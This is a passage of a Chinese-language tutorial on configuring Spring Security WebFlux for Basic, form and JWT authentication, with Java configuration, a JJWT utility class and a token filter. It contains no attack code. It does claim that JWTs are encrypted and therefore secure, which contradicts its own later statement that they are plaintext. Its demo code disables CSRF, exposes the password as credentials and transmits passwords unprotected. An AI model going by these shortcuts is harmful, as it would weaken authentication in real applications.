class="token-line" style="color:#393A34"><span class="token plain">                .antMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .antMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                .anyRequest().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这样，就关闭了 Cookie。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置-spring-security-进行表单认证与鉴权">配置 Spring Security 进行表单认证与鉴权<a href="#配置-spring-security-进行表单认证与鉴权" class="hash-link" aria-label="Direct link to 配置 Spring Security 进行表单认证与鉴权" title="Direct link to 配置 Spring Security 进行表单认证与鉴权">​</a></h3>
<p>表单认证与 Basic 认证类似，只是认证方式不同。只需要将<code>.httpBasic(Customizer.withDefaults())</code>替换成<code>.formLogin(Customizer.withDefaults())</code>即可。如果两者都有，那么是或的关系。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return http</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .httpBasic(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .formLogin(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .authorizeExchange(exchanges -&gt; exchanges</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/public&quot;).permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/private&quot;).authenticated()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .pathMatchers(&quot;/resource/admin&quot;).hasRole(&quot;ADMIN&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                    .anyExchange().permitAll()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .csrf(csrf -&gt; csrf.disable())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .cors(Customizer.withDefaults())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .securityContextRepository(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                NoOpServerSecurityContextRepository.getInstance()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="配置-spring-security-进行-jwt-认证与鉴权">配置 Spring Security 进行 JWT 认证与鉴权<a href="#配置-spring-security-进行-jwt-认证与鉴权" class="hash-link" aria-label="Direct link to 配置 Spring Security 进行 JWT 认证与鉴权" title="Direct link to 配置 Spring Security 进行 JWT 认证与鉴权">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-认证原理">JWT 认证原理<a href="#jwt-认证原理" class="hash-link" aria-label="Direct link to JWT 认证原理" title="Direct link to JWT 认证原理">​</a></h4>
<p>JWT 使用 Bearer Token 认证，它的格式是<code>Bearer token</code>，其中<code>token</code>是 Token 的内容。Token 的内容是一个 JSON 对象，它包含了用户的信息，如用户名、权限等。Token 是加密的，因此是安全的。</p>
<p>其中，具体而言，一个 JWT Token 由三部分组成，分别是 Header、Payload 和 Signature。Header 包含了 Token 的类型和加密算法；Payload 包含了用户的信息；Signature 是 Header 和 Payload 的签名，用于验证 Token 的完整性。三者之间用<code>.</code>分隔。JWT Token 由服务器负责生成，客户端负责保存。</p>
<p>例如，一个 JWT Token 解密后的内容可能是这样的，</p>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;header&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;alg&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;HS256&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;typ&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;JWT&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;payload&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;sub&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;user&quot;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">&quot;roles&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">&quot;USER&quot;</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">}</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token property" style="color:#36acaa">&quot;signature&quot;</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;...&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>JWT 中一定不要存储敏感信息，因为 JWT 本身是明文的。</p>
<p>Payload 中，有一些字段是 JWT 规定的，如<code>sub</code>表示用户，<code>exp</code>表示过期时间，<code>iat</code>表示签发时间等。除此之外，可以自定义字段，如<code>roles</code>表示用户的角色。每一条记录称为一个 Claim，因此 Payload 有时也叫 Claims。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-的解析">JWT 的解析<a href="#jwt-的解析" class="hash-link" aria-label="Direct link to JWT 的解析" title="Direct link to JWT 的解析">​</a></h4>
<p>JWT 一般使用一个轻量级的 JJWT 库进行解析。签发 Token 时，需要指定 Token 的过期时间、签发时间、用户信息等。解码 Token 时，需要指定 Token 的签名密钥。</p>
<p>首先引入依赖，</p>
<div class="language-groovy codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-groovy codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">dependencies {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    implementation &#x27;io.jsonwebtoken:jjwt-api:0.12.6&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    runtimeOnly &#x27;io.jsonwebtoken:jjwt-jackson:0.12.6&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    runtimeOnly &#x27;io.jsonwebtoken:jjwt-impl:0.12.6&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后实现一个 Util 类。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import java.util.*;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import javax.crypto.SecretKey;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.beans.factory.annotation.Value;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.security.core.Authentication;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.security.core.GrantedAuthority;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.security.core.userdetails.ReactiveUserDetailsService;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.security.core.userdetails.UserDetails;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.security.core.userdetails.UserDetailsService;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.springframework.stereotype.Component;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import io.jsonwebtoken.Claims;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import io.jsonwebtoken.Jws;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import io.jsonwebtoken.Jwts;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@Component</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class JwtUtil {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private final ReactiveUserDetailsService userDetailsService;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Value(&quot;#{${jwt.expiration-seconds}}&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private final Integer expirationSeconds;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private final SecretKey key;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public JwtUtil(ReactiveUserDetailsService userDetailsService, </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Value(&quot;${jwt.expiration-seconds}&quot;) Integer expirationSeconds) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.userDetailsService = userDetailsService;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.expirationSeconds = expirationSeconds;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        this.key = Jwts.SIG.HS256.key().build();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public String generateToken(String username) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        UserDetails userDetails = userDetailsService.findByUsername(username).block();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Date expire = new Date(System.currentTimeMillis() + expirationSeconds * 1000);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String id = UUID.randomUUID().toString();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return Jwts.builder()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .header()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .add(&quot;typ&quot;, &quot;JWT&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .add(&quot;alg&quot;, &quot;HS256&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .and()</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .claim(&quot;username&quot;, userDetails.getUsername())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .claim(&quot;authorities&quot;, userDetails.getAuthorities())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .id(id)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .expiration(expire)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .issuedAt(new Date())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .subject(userDetails.getUsername())</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .issuer(&quot;issuer&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .signWith(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                key,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                Jwts.SIG.HS256</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            )</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .compact();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Jws&lt;Claims&gt; parseToken(String token) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return Jwts.parser().verifyWith(key).build().parseSignedClaims(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            token</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        );</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Authentication parseToAuthentication(String token) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        Jws&lt;Claims&gt; jws = parseToken(token);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        UserDetails userDetails = userDetailsService.findByUsername(jws.getPayload().getSubject()).block();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return new Authentication() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            private static final long serialVersionUID = 1L;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public String getName() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return userDetails.getUsername();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return userDetails.getAuthorities();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public Object getCredentials() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return userDetails.getPassword();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public Object getDetails() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return userDetails;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public Object getPrincipal() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return userDetails;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public boolean isAuthenticated() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return true;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                throw new UnsupportedOperationException();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        };</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>注意，如果使用的 Servlet 的 UserDetailsService，使用<code>loadUserDetails</code>方法。这里都是一些简单的构造器方法使用，不再赘述。</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-的签发">JWT 的签发<a href="#jwt-的签发" class="hash-link" aria-label="Direct link to JWT 的签发" title="Direct link to JWT 的签发">​</a></h4>
<p>使用一个简单的 API 进行签发即可。如果在生产环境中，要么使用 HTTPS，要么使用非对称加密进行密码传递。但这里为了演示，就直接传递密码了。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@RestController</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RequestMapping(&quot;/resource&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">@RequiredArgsConstructor</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class MainController {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    JwtUtil jwtUtil;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ReactiveUserDetailsService userDetailsService;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    PasswordEncoder passwordEncoder;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @PostMapping(&quot;/login&quot;)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Mono&lt;String&gt; login(@RequestParam String username, @RequestParam String password) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return userDetailsService.findByUsername(username)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .filter(userDetails -&gt; passwordEncoder.matches(password, userDetails.getPassword()))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .map(userDetails -&gt; jwtUtil.generateToken(username))</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            .switchIfEmpty(Mono.error(new Exception(&quot;Authentication failed&quot;)));</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="jwt-的验证">JWT 的验证<a href="#jwt-的验证" class="hash-link" aria-label="Direct link to JWT 的验证" title="Direct link to JWT 的验证">​</a></h4>
<p>根据前文，我们知道，WebFilter 负责生产 Authentication 对象，而 AuthenticationManager 负责验证 Authentication 对象。</p>
<p>因此，首先我们定义一个 WebFilter 用来解析 Token。这个 WebFilter 都是使用 AuthenticationWebFilter，包含了若干回调函数。这里我们覆写 Convert 即可。</p>
<p>注意，这个类需要一个 AuthenticationManager。但因为 JWT 的解析过程就是验证过程，因此这个 AuthenticationManager 不需要做任何操作。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public Mono&lt;Authentication&gt; authenticate(Authentication authentication) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if(authentication.isAuthenticated()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return Mono.just(authentication);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        } else {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return Mono.empty();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">};</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">filter.setServerAuthenticationConverter(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exchange -&gt; {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        String token = exchange.getRequest().getHeaders().getFirst(&quot;Authorization&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        if (token != null &amp;&amp; token.startsWith(&quot;Bearer &quot;)) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            token = token.substring(7);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            Authentication authentication = jwtUtil.parseToAuthentication(token);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            return Mono.just(authentication);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        return Mono.empty();</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>然后我们把它们加到 SecurityFilterChain 中。</p>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">@Bean</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public SecurityWebFilterChain securityWebFilterChain(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ServerHttpSecurity http,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    @Autowired JwtUtil jwtUtil </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        @Override</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        public Mono&lt;Authentication&gt; authenticate(Authentication authentication) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            if(authentication.isAuthenticated()) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                return Mono.just(authentication);</span><br></span><span class="token-line" 